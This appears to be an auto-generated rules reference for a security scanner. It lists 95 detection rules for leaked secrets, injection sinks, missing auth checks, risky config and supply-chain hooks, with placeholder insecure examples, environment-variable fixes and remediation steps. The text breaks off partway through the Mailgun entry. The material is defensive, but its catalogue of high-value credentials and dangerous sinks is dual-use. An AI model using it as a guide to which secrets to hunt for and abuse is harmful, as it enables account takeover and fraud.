# CyberMat Shield — Security Rules Reference

> Generated from rule registry. **95 rules** across 5 engines.

## Quick Reference

| Rule ID | Severity | Engine | OWASP |
|---------|----------|--------|-------|
| `secrets.aws-access-key-id` | critical | secrets | A04 Cryptographic Failures |
| `secrets.aws-secret-access-key` | critical | secrets | A04 Cryptographic Failures |
| `secrets.azure-client-secret` | critical | secrets | A04 Cryptographic Failures |
| `secrets.gcp-service-account-key` | critical | secrets | A04 Cryptographic Failures |
| `secrets.cloudflare-api-token` | high | secrets | A04 Cryptographic Failures |
| `secrets.clerk-secret-key` | critical | secrets | A04 Cryptographic Failures, A07 Authentication Failures |
| `secrets.nextauth-secret` | high | secrets | A04 Cryptographic Failures, A07 Authentication Failures |
| `secrets.jwt-secret` | high | secrets | A04 Cryptographic Failures, A07 Authentication Failures |
| `secrets.database-url` | critical | secrets | A04 Cryptographic Failures |
| `secrets.mongodb-uri` | critical | secrets | A04 Cryptographic Failures |
| `secrets.redis-url` | high | secrets | A04 Cryptographic Failures |
| `secrets.upstash-redis-token` | high | secrets | A04 Cryptographic Failures |
| `secrets.stripe-secret-key` | critical | secrets | A04 Cryptographic Failures |
| `secrets.stripe-webhook-secret` | high | secrets | A08 Software or Data Integrity Failures |
| `secrets.paypal-client-secret` | critical | secrets | A04 Cryptographic Failures |
| `secrets.lemon-squeezy-api-key` | high | secrets | A04 Cryptographic Failures |
| `secrets.openai-api-key` | high | secrets | A04 Cryptographic Failures |
| `secrets.anthropic-api-key` | high | secrets | A04 Cryptographic Failures |
| `secrets.google-api-key` | high | secrets | A04 Cryptographic Failures |
| `secrets.mistral-api-key` | high | secrets | A04 Cryptographic Failures |
| `secrets.groq-api-key` | high | secrets | A04 Cryptographic Failures |
| `secrets.elevenlabs-api-key` | high | secrets | A04 Cryptographic Failures |
| `secrets.huggingface-token` | high | secrets | A04 Cryptographic Failures |
| `secrets.replicate-api-token` | high | secrets | A04 Cryptographic Failures |
| `secrets.together-api-key` | high | secrets | A04 Cryptographic Failures |
| `secrets.supabase-service-role-key` | critical | secrets | A04 Cryptographic Failures, A07 Authentication Failures |
| `secrets.supabase-jwt-secret` | critical | secrets | A04 Cryptographic Failures, A07 Authentication Failures |
| `secrets.firebase-private-key` | critical | secrets | A04 Cryptographic Failures |
| `secrets.firebase-client-email` | medium | secrets | A02 Security Misconfiguration |
| `secrets.vercel-token` | high | secrets | A04 Cryptographic Failures |
| `secrets.netlify-auth-token` | high | secrets | A04 Cryptographic Failures |
| `secrets.resend-api-key` | high | secrets | A04 Cryptographic Failures |
| `secrets.sendgrid-api-key` | high | secrets | A04 Cryptographic Failures |
| `secrets.mailgun-api-key` | high | secrets | A04 Cryptographic Failures |
| `secrets.twilio-auth-token` | high | secrets | A04 Cryptographic Failures |
| `secrets.slack-bot-token` | high | secrets | A04 Cryptographic Failures |
| `secrets.discord-webhook-url` | medium | secrets | A04 Cryptographic Failures |
| `secrets.telegram-bot-token` | high | secrets | A04 Cryptographic Failures |
| `secrets.sentry-auth-token` | high | secrets | A04 Cryptographic Failures |
| `secrets.sentry-dsn` | info | secrets | A02 Security Misconfiguration |
| `secrets.posthog-api-key` | medium | secrets | A04 Cryptographic Failures |
| `secrets.datadog-api-key` | high | secrets | A04 Cryptographic Failures |
| `secrets.new-relic-license-key` | high | secrets | A04 Cryptographic Failures |
| `secrets.github-token` | high | secrets | A04 Cryptographic Failures |
| `secrets.gitlab-token` | high | secrets | A04 Cryptographic Failures |
| `secrets.npm-token` | high | secrets | A04 Cryptographic Failures, A03 Software Supply Chain Failures |
| `secrets.dockerhub-token` | high | secrets | A04 Cryptographic Failures |
| `secrets.rsa-private-key` | critical | secrets | A04 Cryptographic Failures |
| `secrets.ec-private-key` | critical | secrets | A04 Cryptographic Failures |
| `secrets.openssh-private-key` | critical | secrets | A04 Cryptographic Failures |
| `secrets.pgp-private-key` | critical | secrets | A04 Cryptographic Failures |
| `secrets.generic-private-key` | critical | secrets | A04 Cryptographic Failures |
| `secrets.mysql-connection-string` | critical | secrets | A04 Cryptographic Failures |
| `secrets.mongodb-connection-string` | critical | secrets | A04 Cryptographic Failures |
| `secrets.redis-connection-string` | high | secrets | A04 Cryptographic Failures |
| `secrets.amqp-connection-string` | high | secrets | A04 Cryptographic Failures |
| `secrets.smtp-connection-string` | high | secrets | A04 Cryptographic Failures |
| `injection.dangerous-set-inner-html` | high | static | A05 Injection |
| `injection.inner-html-assignment` | high | static | A05 Injection |
| `injection.document-write` | high | static | A05 Injection |
| `injection.eval-usage` | high | static | A05 Injection |
| `injection.settimeout-string` | medium | static | A05 Injection |
| `injection.prisma-query-raw-unsafe` | critical | static | A05 Injection |
| `injection.sql-string-concat` | high | static | A05 Injection |
| `injection.child-process-exec` | critical | static | A05 Injection |
| `auth.missing-middleware` | medium | static | A01 Broken Access Control, A07 Authentication Failures |
| `auth.admin-route-no-auth` | critical | static | A01 Broken Access Control, A07 Authentication Failures |
| `auth.admin-route-no-role-check` | high | static | A01 Broken Access Control |
| `auth.protected-route-no-auth` | high | static | A01 Broken Access Control, A07 Authentication Failures |
| `auth.webhook-missing-signature` | high | static | A08 Software or Data Integrity Failures |
| `auth.stripe-payment-success-query-param` | high | static | A08 Software or Data Integrity Failures |
| `auth.clerk-api-route-no-auth` | high | static | A01 Broken Access Control, A07 Authentication Failures |
| `auth.user-id-from-body` | high | static | A01 Broken Access Control |
| `auth.supabase-service-role-in-client` | critical | static | A04 Cryptographic Failures, A01 Broken Access Control |
| `auth.stripe-secret-in-client` | critical | static | A04 Cryptographic Failures |
| `config.exposed-env-file` | high | config | A02 Security Misconfiguration, A04 Cryptographic Failures |
| `config.cors-wildcard-origin` | medium | config | A02 Security Misconfiguration |
| `config.next-missing-security-headers` | medium | config | A02 Security Misconfiguration |
| `config.next-source-maps` | medium | config | A02 Security Misconfiguration |
| `config.firebase-permissive-rules` | critical | config | A01 Broken Access Control, A02 Security Misconfiguration |
| `config.supabase-missing-rls` | high | config | A01 Broken Access Control |
| `crypto.token-in-localstorage` | high | static | A04 Cryptographic Failures, A07 Authentication Failures |
| `crypto.token-in-sessionstorage` | medium | static | A04 Cryptographic Failures |
| `crypto.insecure-cookie` | medium | static | A04 Cryptographic Failures, A07 Authentication Failures |
| `supply-chain.lifecycle-postinstall` | medium | dependency | A03 Software Supply Chain Failures |
| `supply-chain.lifecycle-preinstall` | medium | dependency | A03 Software Supply Chain Failures |
| `supply-chain.lifecycle-prepare` | medium | dependency | A03 Software Supply Chain Failures |
| `supply-chain.lifecycle-install` | medium | dependency | A03 Software Supply Chain Failures |
| `supply-chain.wildcard-version` | medium | dependency | A03 Software Supply Chain Failures |
| `supply-chain.missing-lockfile` | medium | dependency | A03 Software Supply Chain Failures |
| `ai.llm-output-html-sink` | high | ai | A05 Injection, A06 Insecure Design |
| `ai.llm-output-critical-sink` | critical | ai | A05 Injection, A06 Insecure Design |
| `ai.tool-call-no-approval` | critical | ai | A06 Insecure Design, A08 Software or Data Integrity Failures |
| `ai.user-input-in-system-prompt` | high | ai | A05 Injection, A06 Insecure Design |
| `ai.rag-injection-risk` | medium | ai | A05 Injection |

## Secret Detection (`secrets`)

### `secrets.aws-access-key-id`

**AWS Access Key ID**

> Full AWS account access including EC2, S3, RDS, Lambda and billing.

| Field | Value |
|-------|-------|
| Severity | `critical` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `aws` `cloud` `iam`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.AWS_ACCESS_KEY_ID; // from environment
```

**Remediation:** Rotate the AWS access key immediately in IAM. Use IAM roles instead of long-lived keys.

---

### `secrets.aws-secret-access-key`

**AWS Secret Access Key**

> Full AWS API access. Paired with an access key this grants complete account control.

| Field | Value |
|-------|-------|
| Severity | `critical` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `aws` `cloud` `iam`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.AWS_SECRET_ACCESS_KEY; // from environment
```

**Remediation:** Rotate immediately. Use AWS Secrets Manager or IAM roles for EC2/Lambda.

---

### `secrets.azure-client-secret`

**Azure Client Secret**

> Unauthorized access to Azure resources and Active Directory tenant.

| Field | Value |
|-------|-------|
| Severity | `critical` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `azure` `cloud` `aad`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.AZURE_CLIENT_SECRET; // from environment
```

**Remediation:** Rotate the client secret in Azure portal. Use Managed Identities where possible.

---

### `secrets.gcp-service-account-key`

**GCP / Firebase Service Account Key**

> Full GCP service account access. Can read/write all resources the account has permissions for.

| Field | Value |
|-------|-------|
| Severity | `critical` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `gcp` `firebase` `cloud`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.GCP_SERVICE_ACCOUNT_KEY; // from environment
```

**Remediation:** Revoke the key in GCP IAM console and rotate. Use Workload Identity Federation instead.

---

### `secrets.cloudflare-api-token`

**Cloudflare API Token**

> Unauthorized DNS changes, zone management, and Workers deployments.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `cloudflare` `cloud` `dns`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.CLOUDFLARE_API_TOKEN; // from environment
```

**Remediation:** Rotate the token in Cloudflare dashboard. Scope tokens to minimum required permissions.

---

### `secrets.clerk-secret-key`

**Clerk Secret Key**

> Full authentication system compromise. Token forgery and user impersonation.

| Field | Value |
|-------|-------|
| Severity | `critical` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures, A07 Authentication Failures

**CWE:** CWE-798, CWE-287

**Tags:** `clerk` `auth` `jwt`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.CLERK_SECRET_KEY; // from environment
```

**Remediation:** Rotate in Clerk dashboard immediately. Never expose in client code.

---

### `secrets.nextauth-secret`

**NextAuth / Auth.js Secret**

> Session and JWT forgery. Attackers can impersonate any user.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures, A07 Authentication Failures

**CWE:** CWE-798, CWE-321

**Tags:** `nextauth` `auth` `session`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.NEXTAUTH_SECRET; // from environment
```

**Remediation:** Rotate the secret. Use a cryptographically random 32+ character value.

---

### `secrets.jwt-secret`

**JWT / Session Secret**

> Token forgery allowing full account impersonation.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures, A07 Authentication Failures

**CWE:** CWE-798, CWE-321

**Tags:** `jwt` `auth` `session`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.JWT_SECRET; // from environment
```

**Remediation:** Rotate the secret. Use openssl rand -base64 32 to generate a strong value.

---

### `secrets.database-url`

**Database Connection String**

> Direct database access with credentials. Full data read/write/delete.

| Field | Value |
|-------|-------|
| Severity | `critical` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `database` `postgres` `credentials`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.DATABASE_URL; // from environment
```

**Remediation:** Rotate database credentials. Never commit connection strings to source control.

---

### `secrets.mongodb-uri`

**MongoDB Connection URI**

> Direct MongoDB access with credentials enabling data exfiltration or destruction.

| Field | Value |
|-------|-------|
| Severity | `critical` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `database` `mongodb` `credentials`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.MONGODB_URI; // from environment
```

**Remediation:** Rotate credentials. Use MongoDB Atlas IP allowlisting and minimal-privilege roles.

---

### `secrets.redis-url`

**Redis Connection URL**

> Unauthorized cache access, session theft, and queue manipulation.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `database` `redis` `cache`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.REDIS_URL; // from environment
```

**Remediation:** Rotate credentials. Use TLS (rediss://) and require authentication.

---

### `secrets.upstash-redis-token`

**Upstash Redis REST Token**

> Full Upstash Redis access. Session data and cached secrets can be read or overwritten.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `upstash` `redis` `credentials`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.UPSTASH_REDIS_TOKEN; // from environment
```

**Remediation:** Rotate the token in Upstash console. Store in server-only environment variables.

---

### `secrets.stripe-secret-key`

**Stripe Secret Key**

> Unauthorized payment processing, customer data access, and financial fraud.

| Field | Value |
|-------|-------|
| Severity | `critical` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `stripe` `payments` `financial`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.STRIPE_SECRET_KEY; // from environment
```

**Remediation:** Rotate the Stripe secret key immediately. Use only in server-side environment variables.

---

### `secrets.stripe-webhook-secret`

**Stripe Webhook Secret**

> Attackers can forge Stripe webhook events to trigger unauthorized payment flows.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A08 Software or Data Integrity Failures

**CWE:** CWE-798

**Tags:** `stripe` `webhook` `payments`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.STRIPE_WEBHOOK_SECRET; // from environment
```

**Remediation:** Rotate the webhook signing secret in Stripe dashboard.

---

### `secrets.paypal-client-secret`

**PayPal Client Secret**

> Unauthorized PayPal API access, payment fraud, and customer data exposure.

| Field | Value |
|-------|-------|
| Severity | `critical` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `paypal` `payments` `financial`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.PAYPAL_CLIENT_SECRET; // from environment
```

**Remediation:** Rotate the client secret in PayPal Developer Dashboard immediately.

---

### `secrets.lemon-squeezy-api-key`

**Lemon Squeezy API Key**

> Unauthorized access to product catalog, subscriptions, and customer data.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `lemon-squeezy` `payments`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.LEMON_SQUEEZY_API_KEY; // from environment
```

**Remediation:** Rotate the API key in Lemon Squeezy dashboard. Store server-side only.

---

### `secrets.openai-api-key`

**OpenAI API Key**

> Unauthorized API usage, unexpected billing, and data exposure via API calls.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `openai` `ai` `llm`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.OPENAI_API_KEY; // from environment
```

**Remediation:** Rotate in OpenAI dashboard. Use a backend proxy; never call OpenAI directly from client code.

---

### `secrets.anthropic-api-key`

**Anthropic API Key**

> Unauthorized Anthropic API usage and unexpected billing.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `anthropic` `ai` `llm`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.ANTHROPIC_API_KEY; // from environment
```

**Remediation:** Rotate in Anthropic console. Store in server-only environment variables.

---

### `secrets.google-api-key`

**Google / Gemini API Key**

> Unauthorized Google API usage billed to your account, potential data leakage.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `google` `gemini` `ai`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.GOOGLE_API_KEY; // from environment
```

**Remediation:** Restrict the key in Google Cloud Console. Rotate and store server-side only.

---

### `secrets.mistral-api-key`

**Mistral API Key**

> Unauthorized Mistral API usage and unexpected billing.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `mistral` `ai` `llm`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.MISTRAL_API_KEY; // from environment
```

**Remediation:** Rotate in Mistral console. Store in server-only environment variables.

---

### `secrets.groq-api-key`

**Groq API Key**

> Unauthorized Groq API usage and model access.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `groq` `ai` `llm`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.GROQ_API_KEY; // from environment
```

**Remediation:** Rotate in Groq console. Store in server-only environment variables.

---

### `secrets.elevenlabs-api-key`

**ElevenLabs API Key**

> Unauthorized voice synthesis usage and billing charges.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `elevenlabs` `ai` `voice`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.ELEVENLABS_API_KEY; // from environment
```

**Remediation:** Rotate in ElevenLabs dashboard. Never expose in client-side code.

---

### `secrets.huggingface-token`

**Hugging Face Token**

> Unauthorized model downloads, private model access, and inference API usage.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `huggingface` `ai` `ml`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.HUGGINGFACE_TOKEN; // from environment
```

**Remediation:** Rotate in Hugging Face settings. Use read-only tokens scoped to required repos.

---

### `secrets.replicate-api-token`

**Replicate API Token**

> Unauthorized model predictions and billing charges.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `replicate` `ai` `ml`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.REPLICATE_API_TOKEN; // from environment
```

**Remediation:** Rotate in Replicate account settings. Store server-side only.

---

### `secrets.together-api-key`

**Together AI API Key**

> Unauthorized LLM inference usage and billing charges.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `together` `ai` `llm`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.TOGETHER_API_KEY; // from environment
```

**Remediation:** Rotate in Together AI dashboard. Store in server-only environment variables.

---

### `secrets.supabase-service-role-key`

**Supabase Service Role Key**

> Full database access bypassing Row Level Security. Anyone with this key can read, write, or delete all data.

| Field | Value |
|-------|-------|
| Severity | `critical` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures, A07 Authentication Failures

**CWE:** CWE-798, CWE-287

**Tags:** `supabase` `database` `auth`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.SUPABASE_SERVICE_ROLE_KEY; // from environment
```

**Remediation:** Rotate in Supabase dashboard. Never expose in client code. Use the anon key for frontend.

---

### `secrets.supabase-jwt-secret`

**Supabase JWT Secret**

> JWT forgery enabling impersonation of any Supabase user including service role.

| Field | Value |
|-------|-------|
| Severity | `critical` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures, A07 Authentication Failures

**CWE:** CWE-798, CWE-321

**Tags:** `supabase` `jwt` `auth`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.SUPABASE_JWT_SECRET; // from environment
```

**Remediation:** Rotate the JWT secret in Supabase project settings.

---

### `secrets.firebase-private-key`

**Firebase / GCP Service Account Private Key**

> Full Firebase Admin SDK access. Can read/write all Firestore data and bypass Security Rules.

| Field | Value |
|-------|-------|
| Severity | `critical` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `firebase` `gcp` `private-key`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.FIREBASE_PRIVATE_KEY; // from environment
```

**Remediation:** Revoke the service account key in GCP console and rotate immediately.

---

### `secrets.firebase-client-email`

**Firebase Service Account Email**

> Service account identity exposed. Combined with private key grants full admin access.

| Field | Value |
|-------|-------|
| Severity | `medium` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A02 Security Misconfiguration

**CWE:** CWE-200

**Tags:** `firebase` `gcp` `service-account`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.FIREBASE_CLIENT_EMAIL; // from environment
```

**Remediation:** Treat service account emails as sensitive. Avoid committing to source control.

---

### `secrets.vercel-token`

**Vercel API Token**

> Unauthorized deployments, environment variable access, and project deletion.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `vercel` `deployment` `ci-cd`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.VERCEL_TOKEN; // from environment
```

**Remediation:** Rotate in Vercel account settings. Scope tokens to specific teams/projects.

---

### `secrets.netlify-auth-token`

**Netlify Auth Token**

> Unauthorized site deployments, environment variable access, and DNS changes.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `netlify` `deployment` `ci-cd`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.NETLIFY_AUTH_TOKEN; // from environment
```

**Remediation:** Rotate in Netlify account settings.

---

### `secrets.resend-api-key`

**Resend API Key**

> Unauthorized email sending, phishing campaigns, and spam from your domain.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `resend` `email` `comms`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.RESEND_API_KEY; // from environment
```

**Remediation:** Rotate the API key in Resend dashboard. Store server-side only.

---

### `secrets.sendgrid-api-key`

**SendGrid API Key**

> Unauthorized email sending from your domain, phishing, and account lockout.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `sendgrid` `email` `comms`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.SENDGRID_API_KEY; // from environment
```

**Remediation:** Rotate the API key in SendGrid settings. Restrict key permissions.

---

### `secrets.mailgun-api-key`

**Mailgun API Key**

> Unauthorized email sending from your Mailgun domain.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `mailgun` `email` `comms`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

